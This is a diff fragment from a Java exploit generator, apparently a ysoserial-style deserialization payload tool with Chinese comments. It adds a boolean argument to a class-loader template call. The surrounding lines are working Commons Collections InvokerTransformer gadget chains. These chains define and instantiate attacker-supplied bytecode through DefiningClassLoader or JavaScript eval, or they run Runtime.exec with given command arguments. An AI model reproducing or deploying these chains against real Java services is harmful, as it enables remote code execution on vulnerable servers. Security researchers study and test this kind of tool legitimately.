@@ -62,7 +62,7 @@ public class TransformerUtil {
 			// 对 BCEL 也支持 EX 或 LF 扩展功能
 			if (command.startsWith("EX-") || command.startsWith("LF-")) {
 				CtClass ctClass = generateClass(command);
-				bcelBytes = generateBCELFormClassBytes(encapsulationByClassLoaderTemplate(ctClass.toBytecode()).toBytecode());
+				bcelBytes = generateBCELFormClassBytes(encapsulationByClassLoaderTemplate(ctClass.toBytecode(), false).toBytecode());
 			} else {
 				bcelBytes = command;
 			}
@@ -79,7 +79,7 @@ public class TransformerUtil {
 				transformers = new Transformer[]{new ConstantTransformer(org.mozilla.javascript.DefiningClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{ctClass.getName(), ctClass.toBytecode()}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
 			} else {
 				// 使用 ScriptEngineManager JS eval 加载
-				transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"JavaScript"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{getJSEngineValue(encapsulationByClassLoaderTemplate(ctClass.toBytecode()).toBytecode())})};
+				transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"JavaScript"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{getJSEngineValue(encapsulationByClassLoaderTemplate(ctClass.toBytecode(), false).toBytecode())})};
 			}
 		} else {
 			transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, (Object[]) execArgs), new ConstantTransformer(Integer.valueOf(1))};
